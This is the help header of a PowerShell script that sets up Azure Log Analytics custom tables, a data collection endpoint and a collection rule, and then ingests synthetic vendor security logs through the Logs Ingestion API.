<#
.SYNOPSIS
    End-to-end Log Analytics custom table ingestion via Logs Ingestion API.
    Creates DCE → custom tables (_CL) → DCR → ingests creative dummy security logs.

.DESCRIPTION
    On first run:  creates DCE, custom _CL tables, DCR with per-vendor streams, links all together.
    On every run:  generates fresh creative dummy logs and ingests via the Logs Ingestion API.

    Authentication: System-assigned Managed Identity via `az` CLI. Requires to have "Monitoring Metrics Publisher" role on the DCR or higher level
    Tables created: SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL

    DCR schema (4 columns per your template):
      TimeGenerated  datetime  — event timestamp (2-5 min random offset)
      RawData        string    — full vendor JSON payload (parse at query time)
      SourceVendor   string    — vendor name for cross-table filtering
      FileName       string    — synthetic source identifier (vendor + date shard)

.PARAMETER ResourceGroup      Resource group containing the Log Analytics Workspace
.PARAMETER WorkspaceName      Log Analytics Workspace name
.PARAMETER Location           Azure region (default: germanywestcentral)
.PARAMETER SubscriptionId     Azure Subscription ID (defaults to current az cli context)
.PARAMETER RecordsPerVendor   How many log records to generate per vendor per run (default: 15)
.PARAMETER SkipInfraSetup     Skip DCE/DCR/table creation (use on subsequent runs for speed)

.EXAMPLE
    # First run — full setup + ingest
    ./Invoke-SecurityLogIngestion.ps1 -ResourceGroup "my-rg-security" -WorkspaceName "my-law-001"

    # Subsequent runs — skip infra, just ingest
    ./Invoke-SecurityLogIngestion.ps1 -ResourceGroup "my-rg-security" -WorkspaceName "my-law-001" -SkipInfraSetup
#>

